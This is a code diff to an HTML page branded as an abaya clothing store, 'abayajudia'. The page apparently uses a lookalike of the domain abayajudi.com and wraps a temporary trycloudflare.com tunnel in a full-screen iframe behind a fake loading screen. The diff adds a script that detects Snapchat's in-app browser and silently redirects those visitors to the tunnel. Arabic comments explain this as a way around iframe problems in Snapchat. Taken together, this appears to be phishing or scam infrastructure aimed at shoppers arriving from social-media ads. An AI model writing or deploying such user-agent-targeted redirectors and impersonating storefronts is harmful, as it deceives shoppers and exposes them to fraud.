@@ -9,6 +9,19 @@
     <meta property="og:image" content="https://abayajudi.com/wp-content/uploads/2024/09/SAVE_20260513_190924.jpg">
     <meta property="og:url" content="https://abayajudia.new-collection/">
     <meta property="og:type" content="website">
+    
+    <!-- سكريبت الفحص والتحويل الفوري إذا كان المتصفح هو سناب شات -->
+    <script>
+        (function() {
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            // التحقق مما إذا كان المستخدم يفتح من تطبيق سناب شات
+            if (ua.indexOf('Snapchat') !== -1) {
+                // توجيه فوري للرابط الأصلي متخطياً مشاكل الـ iframe تماماً في سناب
+                window.location.replace("https://dodge-bidder-watching-television.trycloudflare.com");
+            }
+        })();
+    </script>
+
     <style>
         body, html { 
             margin: 0; 
@@ -20,7 +33,6 @@
             font-family: Tahoma, sans-serif;
         }
         
-        /* شاشة التحميل */
         #loader {
             position: fixed;
             top: 0;
@@ -73,7 +85,6 @@
         <div class="brand-loading">abayajudia</div>
     </div>
 
-    <!-- الـ Iframe -->
     <iframe src="https://dodge-bidder-watching-television.trycloudflare.com" onload="hideLoader()"></iframe>
 
     <script>
